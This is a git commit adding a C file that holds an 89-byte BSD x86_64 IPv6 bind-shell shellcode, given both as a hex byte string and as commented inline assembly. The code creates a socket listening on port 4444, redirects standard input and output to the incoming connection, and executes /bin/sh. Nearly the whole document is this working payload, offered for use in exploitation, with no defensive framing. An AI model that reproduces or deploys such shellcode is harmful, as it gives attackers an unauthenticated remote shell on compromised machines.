f83eab63f6b98b781c5cd5710468715f94e3bb33
EarthQuake <earthquake@aerelon-2.local>
2015-06-13 00:26:27 +0200

    ipv6 x64 bsd bind shellcode

---
+++ x86_64_bsd_ipv6_bind_tcp.asm.c
@@ -0,0 +1,94 @@
+/*
+BSD x86_64 ipv6 bind_tcp shellcode, 89 bytes
+Balazs Bucsay
+@xoreipeip | earthquake <at@> rycon <do.t> hu  
+http://rycon.hu
+
+port = 4444
+ip = ::1
+
+The shellcode contains only one null byte, that can be removed easily with
+some shellcoding experience. But it increases the length of the code.
+
+char shellcode[] = \
+"\x6a\x61\x58\x99\x6a\x1c\x5f\x6a\x01\x5e\x0f\x05\x48\x97\x52\x52\x52\x68"
+"\x00\x1c\x11\x5c\x48\x89\xe6\x6a\x1c\x5a\x04\x4c\x0f\x05\x48\x31\xf6\x6a"
+"\x6a\x58\x0f\x05\x99\x04\x1e\x0f\x05\x48\x89\xc7\x6a\x5a\x58\x0f\x05\xff"
+"\xc6\x04\x5a\x0f\x05\xff\xc6\x04\x59\x0f\x05\x52\x48\xbf\x2f\x2f\x62\x69"
+"\x6e\x2f\x73\x68\x57\x48\x89\xe7\x52\x57\x48\x89\xe6\x04\x39\x0f\x05";
+*/
+
+int main() 
+{
+	asm(
+	// socket(2,1,0);
+	"	push $97		\n"
+	"	pop %rax		\n"
+	"	cltd			\n"
+	"	push $0x1c		\n"
+	"	pop %rdi		\n"
+	"	push $0x01		\n"
+	"	pop %rsi		\n"
+	"	syscall	   		\n"
+	
+
+	/*
+	1  uint8_t 	sin_len
+	1 sa_family_t 	sin_family
+	2 in_port_t 	sin_port
+	4 struct in_addr 	sin_addr
+	8 char 	sin_zero [8]
+	00 02 5C11 00000000 00000000 00000000
+	5c11 => 4444
+	*/
+	// bind(s, struct, $16)
+	"	xchg %rax, %rdi		\n"
+	"	push %rdx		\n"
+	"	push %rdx		\n"
+	"	push %rdx		\n"
+	"	push $0x5C111c00	\n"
+	"	mov %rsp, %rsi  	\n"
+	"	push $28	  	\n"
+	"	pop %rdx		\n"
+	" 	add $76, %al		\n"
+	"	syscall	   		\n"
+
+	//listen(s, 0)
+	"	xor %rsi, %rsi		\n"
+	"	push $106		\n"
+	"	pop %rax		\n"
+	"	syscall	   		\n"
+
+	// accept(s, 0, 0)
+	"	cltd			\n"
+	"	add $30, %al		\n"
+	"	syscall	   		\n"
+
+	// dup2(c, 0);
+	"	mov %rax, %rdi		\n"
+	"	push $90		\n"
+	"	pop %rax		\n"
+	"	syscall	   		\n"
+
+	// dup2(c, 1);
+	"	inc %esi		\n"
+	"	add $90, %al		\n"
+	"	syscall	   		\n"
+
+	// dup2(c, 2);
+	"	inc %esi		\n"
+	"	add $89, %al		\n"
+	"	syscall	   		\n"
+
+	// execve("/bin/sh", {"/bin/sh", 0}, 0)
+	" 	push %rdx		\n"
+	"	mov $0x68732f6e69622f2f, %rdi\n"
+	"	push %rdi		\n"
+	"	mov %rsp, %rdi		\n"
+	"	push %rdx		\n"
+	"	push %rdi		\n"
+	"	mov %rsp, %rsi		\n"
+	"	add $57, %al		\n"
+	"	syscall	   		\n"
+	);
+}
